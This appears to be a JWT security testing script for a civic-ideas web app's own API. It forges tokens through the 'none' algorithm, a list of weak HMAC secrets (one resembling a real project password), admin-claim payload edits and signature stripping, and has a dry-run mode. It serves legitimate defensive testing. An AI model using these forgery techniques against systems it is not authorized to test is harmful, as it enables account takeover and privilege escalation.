#!/usr/bin/env python3
"""
JWT Security Testing Script for OpenCitiVibes

Tests for common JWT vulnerabilities:
- Algorithm confusion (none, HS256 vs RS256)
- Weak secrets
- Token manipulation
- Missing expiration
- Signature bypass

Supports --no-exec mode for safe dry-run analysis.

Uses dynamic credential discovery - no hardcoded credentials.
"""

import argparse
import json
import base64
import hmac
import hashlib
import requests
import sys
import os
from pathlib import Path
from datetime import datetime, timedelta
from typing import Optional, List, Dict

# Add helpers to path
sys.path.insert(0, str(Path(__file__).parent / "helpers"))

# Configuration
SCAN_DIR = os.environ.get("SCAN_DIR", "/app/results/jwt")

# Common weak secrets to test
WEAK_SECRETS = [
    "secret",
    "password",
    "jwt_secret",
    "your-256-bit-secret",
    "your-secret-key",
    "supersecret",
    "development",
    "dev-secret-key-change-in-production",
    "opencitivibes",
    "idees-montreal",
    "Admin2024!Mtl",
    "changeme",
    "qwerty123",
]


class JWTTester:
    def __init__(self, no_exec: bool = False, token: Optional[str] = None, target: Optional[str] = None):
        self.results = []
        self.payloads = []  # Store generated payloads for --no-exec mode
        self.token = token
        self.no_exec = no_exec
        self.target_api = target or os.environ.get("TARGET_API", "http://backend:8000/api")
        self.session = requests.Session()
        self.user_info = {}

        # Create results directory
        Path(SCAN_DIR).mkdir(parents=True, exist_ok=True)

    def log(self, level: str, message: str):
        """Log message with timestamp."""
        timestamp = datetime.now().isoformat()
        print(f"[{timestamp}] [{level}] {message}")

        self.results.append({
            "timestamp": timestamp,
            "level": level,
            "message": message
        })

    def get_token(self) -> str:
        """Obtain a valid JWT token using dynamic credential discovery."""
        # If token was provided via command line, use it
        if self.token:
            self.log("INFO", f"Using provided token: {self.token[:50]}...")
            return self.token

        # In no-exec mode, we need a token to analyze
        if self.no_exec:
            self.log("ERROR", "No-exec mode requires --token argument")
            return None

        # Import dynamically to avoid issues when running in --no-exec mode without deps
        try:
            from auth_discovery import get_authenticated_session, TARGET_API
            self.target_api = TARGET_API
        except ImportError:
            self.log("ERROR", "auth_discovery module not found")
            return None

        self.session, token, self.user_info = get_authenticated_session()

        if token:
            self.log("INFO", f"Authenticated as: {self.user_info.get('email')}")
            self.log("INFO", f"Obtained valid token: {token[:50]}...")
            return token
        else:
            self.log("ERROR", "Failed to obtain token - could not authenticate")
            return None

    def _make_request(self, endpoint: str, token: str) -> Optional[requests.Response]:
        """Make a request or store payload in no-exec mode."""
        if self.no_exec:
            # Store payload for review instead of executing
            self.payloads.append({
                "endpoint": f"{self.target_api}/{endpoint}",
                "token": token[:100] + "..." if len(token) > 100 else token,
                "curl": f'curl -H "Authorization: Bearer {token}" "{self.target_api}/{endpoint}"'
            })
            return None

        return self.session.get(
            f"{self.target_api}/{endpoint}",
            headers={"Authorization": f"Bearer {token}"}
        )

    def decode_token(self, token: str) -> dict:
        """Decode JWT without verification."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            # Decode header and payload
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))

            return {
                "header": header,
                "payload": payload,
                "signature": parts[2]
            }
        except Exception as e:
            self.log("ERROR", f"Failed to decode token: {e}")
            return None

    def test_algorithm_none(self):
        """Test for algorithm confusion with 'none' algorithm."""
        self.log("INFO", "Testing algorithm 'none' bypass...")

        # Decode original token
        decoded = self.decode_token(self.token)
        if not decoded:
            return

        # Create token with alg:none
        header = {"alg": "none", "typ": "JWT"}
        payload = decoded["payload"]

        # Encode without signature
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip("=")
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip("=")

        # Try different variations
        none_tokens = [
            f"{header_b64}.{payload_b64}.",
            f"{header_b64}.{payload_b64}",
            f"{header_b64}.{payload_b64}.signature",
        ]

        for none_token in none_tokens:
            response = self._make_request("auth/me", none_token)

            if response and response.status_code == 200:
                self.log("CRITICAL", "Algorithm 'none' bypass SUCCESSFUL!")
                return True

        if self.no_exec:
            self.log("INFO", "Generated none-algorithm bypass payloads (no-exec mode)")
        else:
            self.log("INFO", "Algorithm 'none' bypass failed (good)")
        return False

    def test_weak_secrets(self):
        """Test for weak signing secrets."""
        self.log("INFO", "Testing for weak JWT secrets...")

        decoded = self.decode_token(self.token)
        if not decoded:
            return []

        vulnerable_secrets = []

        for secret in WEAK_SECRETS:
            # Create signature with weak secret
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(decoded["header"]).encode()
            ).decode().rstrip("=")
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(decoded["payload"]).encode()
            ).decode().rstrip("=")

            message = f"{header_b64}.{payload_b64}"

            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
            signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")

            forged_token = f"{message}.{signature_b64}"

            response = self._make_request("auth/me", forged_token)

            if response and response.status_code == 200:
                self.log("CRITICAL", f"Weak secret found: '{secret}'")
                vulnerable_secrets.append(secret)

        if self.no_exec:
            self.log("INFO", f"Generated {len(WEAK_SECRETS)} weak secret test payloads (no-exec mode)")
        elif not vulnerable_secrets:
            self.log("INFO", "No weak secrets found (good)")

        return vulnerable_secrets

    def test_token_manipulation(self):
        """Test token payload manipulation."""
        self.log("INFO", "Testing token payload manipulation...")

        decoded = self.decode_token(self.token)
        if not decoded:
            return

        # Try to elevate privileges
        manipulated_payloads = [
            {"sub": "admin@idees-montreal.ca", "is_admin": True},
            {"sub": "admin@idees-montreal.ca", "role": "admin"},
            {"sub": "admin@idees-montreal.ca", "is_global_admin": True},
        ]

        for payload in manipulated_payloads:
            # Merge with original payload
            new_payload = {**decoded["payload"], **payload}

            header_b64 = base64.urlsafe_b64encode(
                json.dumps(decoded["header"]).encode()
            ).decode().rstrip("=")
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(new_payload).encode()
            ).decode().rstrip("=")

            # Try with original signature (shouldn't work)
            manipulated_token = f"{header_b64}.{payload_b64}.{decoded['signature']}"

            response = self._make_request("auth/me", manipulated_token)

            if response and response.status_code == 200:
                self.log("CRITICAL", f"Token manipulation accepted: {payload}")
            elif not self.no_exec:
                self.log("INFO", f"Token manipulation rejected (good): {payload}")

        if self.no_exec:
            self.log("INFO", f"Generated {len(manipulated_payloads)} manipulation test payloads (no-exec mode)")

    def test_expired_token(self):
        """Test if expired tokens are accepted."""
        self.log("INFO", "Testing expired token handling...")

        decoded = self.decode_token(self.token)
        if not decoded:
            return

        # Check if exp claim exists
        if "exp" not in decoded["payload"]:
            self.log("HIGH", "Token has no expiration claim!")
            return

        exp = decoded["payload"]["exp"]
        current_time = datetime.now().timestamp()

        self.log("INFO", f"Token expires at: {datetime.fromtimestamp(exp)}")
        self.log("INFO", f"Time until expiry: {exp - current_time:.0f} seconds")

        # Note: We can't easily test with an expired token without waiting
        # But we can check the expiration time is reasonable
        max_reasonable_expiry = current_time + (24 * 60 * 60)  # 24 hours

        if exp > max_reasonable_expiry:
            self.log("MEDIUM", "Token expiration is very long (>24h)")

    def test_signature_stripping(self):
        """Test if signature is properly validated."""
        self.log("INFO", "Testing signature validation...")

        decoded = self.decode_token(self.token)
        if not decoded:
            return

        header_b64 = base64.urlsafe_b64encode(
            json.dumps(decoded["header"]).encode()
        ).decode().rstrip("=")
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(decoded["payload"]).encode()
        ).decode().rstrip("=")

        # Test tokens with modified/stripped signatures
        test_tokens = [
            f"{header_b64}.{payload_b64}.",  # Empty signature
            f"{header_b64}.{payload_b64}.invalid",  # Invalid signature
            f"{header_b64}.{payload_b64}.AAAA",  # Short signature
            f"{self.token[:-10]}",  # Truncated token
        ]

        for test_token in test_tokens:
            response = self._make_request("auth/me", test_token)

            if response and response.status_code == 200:
                self.log("CRITICAL", f"Invalid signature accepted: {test_token[:50]}...")
            elif not self.no_exec:
                self.log("INFO", "Invalid signature rejected (good)")

        if self.no_exec:
            self.log("INFO", f"Generated {len(test_tokens)} signature bypass payloads (no-exec mode)")

    def run_all_tests(self):
        """Run all JWT security tests."""
        self.log("INFO", "=" * 50)
        self.log("INFO", "JWT Security Testing Suite")
        if self.no_exec:
            self.log("INFO", "Running in NO-EXEC mode (dry run)")
        self.log("INFO", "=" * 50)

        # Get valid token
        self.token = self.get_token()
        if not self.token:
            self.log("ERROR", "Cannot proceed without valid token")
            return

        # Decode and analyze token
        decoded = self.decode_token(self.token)
        if decoded:
            self.log("INFO", f"Token algorithm: {decoded['header'].get('alg')}")
            self.log("INFO", f"Token payload: {decoded['payload']}")

        # Run tests
        self.test_algorithm_none()
        self.test_weak_secrets()
        self.test_token_manipulation()
        self.test_expired_token()
        self.test_signature_stripping()

        # Save results
        results_file = Path(SCAN_DIR) / "jwt-test-results.json"
        output = {
            "mode": "no-exec" if self.no_exec else "live",
            "results": self.results,
        }

        # Include payloads in no-exec mode for review
        if self.no_exec and self.payloads:
            output["payloads"] = self.payloads
            payloads_file = Path(SCAN_DIR) / "jwt-test-payloads.json"
            with open(payloads_file, "w") as f:
                json.dump(self.payloads, f, indent=2)
            self.log("INFO", f"Payloads saved to: {payloads_file}")

        with open(results_file, "w") as f:
            json.dump(output, f, indent=2)

        self.log("INFO", f"Results saved to: {results_file}")

        # Summary
        critical = sum(1 for r in self.results if r["level"] == "CRITICAL")
        high = sum(1 for r in self.results if r["level"] == "HIGH")
        medium = sum(1 for r in self.results if r["level"] == "MEDIUM")

        self.log("INFO", "=" * 50)
        self.log("INFO", f"Summary: {critical} Critical, {high} High, {medium} Medium")
        if self.no_exec:
            self.log("INFO", f"Payloads generated: {len(self.payloads)}")
        self.log("INFO", "=" * 50)


def main():
    parser = argparse.ArgumentParser(
        description="JWT Security Testing Script",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Live testing (authenticates and sends requests)
  python jwt-test.py

  # Dry-run mode (generates payloads without sending)
  python jwt-test.py --no-exec --token "eyJ..."

  # Specify target API
  python jwt-test.py --target http://localhost:8000/api
        """
    )

    parser.add_argument(
        "--no-exec",
        action="store_true",
        help="Dry-run mode: generate payloads without executing requests"
    )

    parser.add_argument(
        "--token",
        type=str,
        help="JWT token to analyze (required in --no-exec mode)"
    )

    parser.add_argument(
        "--target",
        type=str,
        help="Target API URL (default: from env or http://backend:8000/api)"
    )

    args = parser.parse_args()

    # Validate arguments
    if args.no_exec and not args.token:
        parser.error("--no-exec mode requires --token argument")

    tester = JWTTester(
        no_exec=args.no_exec,
        token=args.token,
        target=args.target
    )
    tester.run_all_tests()


if __name__ == "__main__":
    main()
